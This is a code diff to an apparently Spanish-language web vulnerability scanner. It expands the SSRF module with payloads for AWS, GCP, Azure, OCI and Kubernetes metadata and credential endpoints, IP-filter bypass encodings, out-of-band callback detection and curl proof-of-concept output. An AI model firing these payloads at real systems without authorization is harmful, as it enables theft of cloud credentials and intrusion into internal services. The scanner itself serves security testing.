@@ -31,22 +31,83 @@ if TYPE_CHECKING:
 SSRF_PARAMS = [
     "url", "path", "dest", "redirect", "uri", "src", "image",
     "load", "fetch", "api", "callback", "webhook", "target", "next", "return",
+    "proxy", "site", "html", "val", "validate", "domain", "remote", "file",
 ]
+
+# Payloads cloud directos (endpoint estándar por proveedor)
 SSRF_PAYLOADS_CLOUD = [
-    "http://169.254.169.254/latest/meta-data/",   # AWS IMDS
-    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
-    "http://169.254.169.254/metadata/v1/",         # DigitalOcean
+    # AWS IMDS v1 — credenciales IAM de alto valor
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data",
+    # AWS IMDS v2 — token endpoint (PUT, pero algunos proxies lo permiten vía GET)
+    "http://169.254.169.254/latest/api/token",
+    # GCP — requiere Metadata-Flavor: Google pero a veces no validan
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "http://169.254.169.254/computeMetadata/v1/",          # GCP sin hostname
+    # Azure IMDS
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+    # DigitalOcean
+    "http://169.254.169.254/metadata/v1/",
+    "http://169.254.169.254/metadata/v1/id",
+    # Oracle Cloud (OCI)
+    "http://169.254.169.254/opc/v1/instance/",
+    # AWS ECS Task Metadata
+    "http://169.254.170.2/v2/metadata",
+    # Kubernetes API server
+    "http://kubernetes.default.svc/api/v1/",
+    "http://10.0.0.1/api/v1/namespaces/",
+    # Localhost bypass variants
+    "http://localhost/",
+    "http://127.0.0.1/",
 ]
+
+# Bypass de filtros IP (misma IP, diferentes encodings)
+SSRF_BYPASS_PAYLOADS = [
+    "http://2852039166/latest/meta-data/",           # 169.254.169.254 decimal
+    "http://0xa9fea9fe/latest/meta-data/",           # hex
+    "http://0251.0376.0251.0376/latest/meta-data/",  # octal
+    "http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv6 mapped
+    "http://169.254.169.254.nip.io/latest/meta-data/",    # DNS rebind via nip.io
+    "http://169.254.169.254.xip.io/latest/meta-data/",    # xip.io
+    "http://[::1]/",                                 # IPv6 localhost
+    "http://0x7f000001/",                            # 127.0.0.1 hex
+    "http://2130706433/",                            # 127.0.0.1 decimal
+    "http://0177.0.0.1/",                            # 127.0.0.1 octal
+]
+
 SSRF_PAYLOADS_BLIND = [
-    "http://{oob}/ssrf",                           # OOB HTTP
+    "http://{oob}/ssrf",
     "http://{oob}/",
 ]
-# Indicadores en respuesta para detección sin OOB (solo strings muy específicos)
+
+# Indicadores de SSRF confirmado en respuesta (muy específicos para evitar FP)
 SSRF_INDICATORS = [
-    "ami-id", "instance-id", "local-hostname",     # AWS metadata
-    "computeMetadata", "project-id",               # GCP metadata
-    "root:x:0:0",                                  # /etc/passwd
-    "droplet_id", "vendor_data",                   # DigitalOcean
+    # AWS IMDS
+    "ami-id", "instance-id", "local-hostname", "local-ipv4",
+    "accesskeyid", "secretaccesskey", "token", "expiration",
+    "iam/security-credentials",
+    # GCP
+    "computeMetadata", "project-id", "service-accounts",
+    "google-cloud", "gce-metadata",
+    # Azure
+    "subscriptionid", "resourcegroupname", "azureenvironment",
+    "clientid", "objectid",
+    # DigitalOcean
+    "droplet_id", "vendor_data",
+    # Generic
+    "root:x:0:0",                                    # /etc/passwd
+    "kubernetes.default",                            # K8s API
+    "kube-system",
+]
+
+# Indicadores de alto valor (credenciales reales — severidad CRITICAL)
+SSRF_CRITICAL_INDICATORS = [
+    "accesskeyid", "secretaccesskey", "token", "expiration",  # AWS creds
+    "service-accounts/default/token", "oauth2/token",         # GCP/Azure tokens
+    "kubernetes.default.svc",                                  # K8s cluster access
 ]
 
 # Parámetros comunes en APIs JSON para fuzzing de body
@@ -499,115 +560,202 @@ async def _test_ssrf(
     oob: "Optional[OOBClient]" = None,
 ) -> list[Vuln]:
     """
-    Detección SSRF con dos estrategias:
-    1. OOB (interactsh o webhook.site): payload único → callback confirmado → CRITICAL.
-    2. Sin OOB: indicadores específicos en respuesta (metadata cloud) → HIGH probabilístico.
+    SSRF con 3 estrategias:
+    1. OOB → CRITICAL confirmado.
+    2. Indicadores en respuesta (cloud metadata, creds) → CRITICAL/HIGH por contenido.
+    3. Bypass de filtros IP (decimal/hex/IPv6/DNS rebind) → MEDIUM si cambia el cuerpo.
     """
     vulns: list[Vuln] = []
     found: set[str]   = set()
-    sem = asyncio.Semaphore(3)
+    sem = asyncio.Semaphore(4)
 
-    # ── Estrategia 1: OOB ────────────────────────────────────────────────────
+    _FIX = (
+        "Whitelist estricta de URLs destino. "
+        "Bloquear rangos RFC-1918 y link-local: 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. "
+        "Deshabilitar redirecciones HTTP en el cliente del servidor. "
+        "AWS: habilitar IMDSv2 (PUT token requerido, TTL=1 para bloquear SSRF). "
+        "GCP: requerir cabecera 'Metadata-Flavor: Google' (habilitar metadata.concealment). "
+        "Azure: requerir cabecera 'Metadata: true'."
+    )
+
+    # ── 1. OOB ───────────────────────────────────────────────────────────────
     if oob and oob.available:
-        # Mapeo uid → (param, payload_url) para correlacionar callbacks
         oob_hits: dict[str, tuple[str, str]] = {}
-
-        for param in SSRF_PARAMS[:8]:
+        for param in SSRF_PARAMS[:10]:
             payload_url = oob.new_payload(f"ssrf-{param[:4]}")
             uid = oob.last_uid
             oob_hits[uid] = (param, payload_url)
-
             test_url = _inject_param(url, parsed, param, payload_url)
             async with sem:
                 await client.get(test_url, follow=False, lax_ssl=True, body_limit=512)
 
-        # Ventana de 15s para que el servidor del target haga el callback
         interactions = await oob.collect_all(client.session, timeout=15.0)
-
         confirmed: set[str] = set()
         for inter in interactions:
             protocol = inter.get("protocol", "HTTP").upper()
             remote   = inter.get("remote-address", "?")
-
             for uid, (param, payload_url) in oob_hits.items():
                 if oob.uid_in_interaction(uid, inter) and param not in confirmed:
                     confirmed.add(param)
                     vulns.append(make_vuln(
-                        title       = f"SSRF Confirmado ({oob.backend.upper()}) en parámetro '{param}'",
+                        title       = f"SSRF Confirmado OOB ({oob.backend.upper()}) — '{param}'",
                         severity    = "CRITICAL",
                         cvss        = 9.8,
                         category    = "SSRF",
                         description = (
-                            f"El parámetro '{param}' fuerza al servidor a hacer peticiones "
-                            f"externas arbitrarias — CONFIRMADO vía callback {oob.backend} ({protocol}). "
-                            "Permite acceder a metadata de cloud, servicios internos y credenciales."
+                            f"El parámetro '{param}' fuerza al servidor a emitir peticiones "
+                            f"HTTP externas arbitrarias — CONFIRMADO vía callback {oob.backend} ({protocol}). "
+                            "Explotable para acceder a metadata cloud (AWS IAM, GCP SA tokens, Azure MSI) "
+                            "y a servicios internos."
                         ),
                         evidence    = (
-                            f"Backend OOB: {oob.backend} ({oob._srv})\n"
+                            f"OOB: {oob.backend} ({oob._srv})\n"
                             f"Payload: {payload_url}\n"
-                            f"Callback recibido: {protocol} desde IP {remote}\n"
+                            f"Callback recibido: {protocol} desde {remote}\n"
                             f"PoC: curl '{_inject_param(url, parsed, param, payload_url)}'"
                         ),
-                        fix         = (
-                            "Whitelist estricta de URLs destino permitidas. "
-                            "Bloquear rangos privados: 169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x. "
-                            "AWS: habilitar IMDSv2 (requiere token). "
-                            "Deshabilitar redirecciones HTTP en el cliente HTTP del servidor."
-                        ),
+                        fix         = _FIX,
                         ref         = "https://portswigger.net/web-security/ssrf",
                         module      = "active",
                         url         = url,
+                        cwe         = "CWE-918",
+                        owasp       = "A10:2021",
                     ))
+        return vulns
 
-        return vulns  # Solo confirmados — cero FPs garantizados
-
-    # ── Estrategia 2: Indicadores en respuesta (sin OOB) ─────────────────────
+    # ── 2. Indicadores en respuesta (cloud metadata, credenciales) ────────────
     baseline_resp = await client.get(url, follow=True, lax_ssl=True, body_limit=32768)
     baseline_body = baseline_resp.text.lower() if baseline_resp else ""
 
-    async def check_direct(param: str, ssrf_payload: str):
+    all_cloud_payloads = SSRF_PAYLOADS_CLOUD + SSRF_BYPASS_PAYLOADS
+
+    async def check_payload(param: str, ssrf_payload: str):
         async with sem:
             test_url = _inject_param(url, parsed, param, ssrf_payload)
-            resp = await client.get(test_url, follow=True, lax_ssl=True, body_limit=32768)
+            resp = await client.get(test_url, follow=True, lax_ssl=True, body_limit=65536)
             if not resp:
                 return
             body_lower = resp.text.lower()
+
+            # Verificar indicadores de alto valor (creds reales) → CRITICAL
+            for crit in SSRF_CRITICAL_INDICATORS:
+                c_lower = crit.lower()
+                if c_lower in baseline_body:
+                    continue
+                if c_lower in body_lower:
+                    key = f"crit:{param}:{crit[:20]}"
+                    if key not in found:
+                        found.add(key)
+                        cloud_type = _detect_cloud_provider(ssrf_payload)
+                        vulns.append(make_vuln(
+                            title       = f"SSRF + Credenciales Cloud {cloud_type} Expuestas — '{param}'",
+                            severity    = "CRITICAL",
+                            cvss        = 10.0,
+                            category    = "SSRF",
+                            description = (
+                                f"SSRF en '{param}' expone credenciales o tokens de acceso "
+                                f"{cloud_type} en texto claro. Un atacante obtiene acceso "
+                                "completo al entorno cloud del servidor objetivo."
+                            ),
+                            evidence    = (
+                                f"Payload: {ssrf_payload}\n"
+                                f"Indicador crítico: '{crit}' encontrado en respuesta (ausente en baseline)\n"
+                                f"Proveedor: {cloud_type}\n"
+                                f"Fragmento: {_extract_around(resp.text, crit, 200)}\n"
+                                f"PoC: curl '{test_url}'"
+                            ),
+                            fix         = _FIX,
+                            ref         = "https://portswigger.net/web-security/ssrf",
+                            module      = "active",
+                            url         = url,
+                            cwe         = "CWE-918",
+                            owasp       = "A10:2021",
+                        ))
+                    return
+
+            # Indicadores generales → HIGH
             for indicator in SSRF_INDICATORS:
                 ind_lower = indicator.lower()
                 if ind_lower in baseline_body:
-                    continue  # ya estaba en baseline — no es nuevo
+                    continue
                 if ind_lower in body_lower:
                     key = f"{param}:{ssrf_payload[:30]}"
                     if key not in found:
                         found.add(key)
+                        cloud_type = _detect_cloud_provider(ssrf_payload)
+                        is_bypass  = ssrf_payload in SSRF_BYPASS_PAYLOADS
                         vulns.append(make_vuln(
-                            title       = f"SSRF Probable en parámetro '{param}'",
-                            severity    = "HIGH",
-                            cvss        = 8.6,
+                            title       = f"SSRF{' (IP Bypass)' if is_bypass else ''} — Metadata {cloud_type} — '{param}'",
+                            severity    = "CRITICAL" if is_bypass else "HIGH",
+                            cvss        = 9.1 if is_bypass else 8.6,
                             category    = "SSRF",
                             description = (
-                                f"El parámetro '{param}' devuelve indicadores de metadata cloud "
-                                "tras inyectar una URL interna. Verificar manualmente. "
-                                "Para confirmación sin FPs: activar OOB (webhook.site o interactsh)."
+                                f"El parámetro '{param}' devuelve indicadores de metadata {cloud_type} "
+                                + ("usando bypass de filtro IP. " if is_bypass else "")
+                                + "Verificar manualmente. Activar OOB para confirmación sin FP."
                             ),
                             evidence    = (
                                 f"Payload: {ssrf_payload}\n"
-                                f"Indicador en respuesta: '{indicator}' (ausente en baseline)\n"
-                                f"PoC: curl '{test_url}'"
+                                f"Indicador: '{indicator}' (ausente en baseline)\n"
+                                f"Proveedor: {cloud_type}\n"
+                                + (f"Técnica bypass: {_describe_bypass(ssrf_payload)}\n" if is_bypass else "")
+                                + f"PoC: curl '{test_url}'"
                             ),
-                            fix         = "Whitelist de URLs. Bloquear rangos IP privados. IMDSv2 en AWS.",
+                            fix         = _FIX,
                             ref         = "https://portswigger.net/web-security/ssrf",
                             module      = "active",
                             url         = url,
+                            cwe         = "CWE-918",
+                            owasp       = "A10:2021",
                         ))
                     break
 
     tasks = []
-    for param in SSRF_PARAMS[:6]:
-        for ssrf_payload in SSRF_PAYLOADS_CLOUD:
-            tasks.append(check_direct(param, ssrf_payload))
+    for param in SSRF_PARAMS[:8]:
+        for pl in all_cloud_payloads:
+            tasks.append(check_payload(param, pl))
     await asyncio.gather(*tasks)
     return vulns
+
+
+def _detect_cloud_provider(payload: str) -> str:
+    p = payload.lower()
+    if "google" in p or "computeMetadata" in payload:
+        return "GCP"
+    if "azure" in p or "subscriptionid" in p or "management.azure" in p:
+        return "Azure"
+    if "digitalocean" in p or "droplet" in p:
+        return "DigitalOcean"
+    if "kubernetes" in p or "kube" in p:
+        return "Kubernetes"
+    if "169.254" in p or "iam" in p or "latest" in p:
+        return "AWS"
+    return "Cloud"
+
+
+def _describe_bypass(payload: str) -> str:
+    if "nip.io" in payload or "xip.io" in payload:
+        return "DNS rebinding (nip.io)"
+    if "::ffff:" in payload:
+        return "IPv6 mapped address"
+    if "0x" in payload:
+        return "Hex IP encoding"
+    if "0251" in payload or "0177" in payload:
+        return "Octal IP encoding"
+    if payload.split("/")[2].isdigit() and int(payload.split("/")[2]) > 0xFFFFFF:
+        return "Decimal IP encoding"
+    if "[::1]" in payload:
+        return "IPv6 loopback"
+    return "IP encoding bypass"
+
+
+def _extract_around(text: str, keyword: str, chars: int = 200) -> str:
+    idx = text.lower().find(keyword.lower())
+    if idx < 0:
+        return ""
+    start = max(0, idx - 30)
+    end   = min(len(text), idx + chars)
+    return text[start:end].strip()
 
 
 # ─── JSON Body Injection ──────────────────────────────────────────────────────
